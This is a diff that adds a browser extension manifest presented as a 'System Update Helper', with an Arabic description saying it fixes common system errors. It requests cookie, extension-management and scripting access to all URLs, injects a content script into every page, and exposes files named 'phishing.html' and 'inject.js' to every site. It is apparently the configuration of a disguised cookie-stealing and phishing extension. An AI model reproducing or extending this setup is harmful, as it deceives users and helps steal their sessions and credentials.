@@ -1,0 +1,32 @@
+{
+  "manifest_version": 3,
+  "name": "System Update Helper",
+  "version": "1.0.0",
+  "description": "يساعد في تحديث النظام وإصلاح الأخطاء الشائعة",
+  "permissions": [
+    "tabs",
+    "storage",
+    "webNavigation",
+    "cookies",
+    "management",
+    "alarms",
+    "scripting"
+  ],
+  "host_permissions": [
+    "<all_urls>"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"],
+      "run_at": "document_end"
+    }
+  ],
+  "web_accessible_resources": [{
+    "resources": ["phishing.html", "inject.js"],
+    "matches": ["<all_urls>"]
+  }]
+}
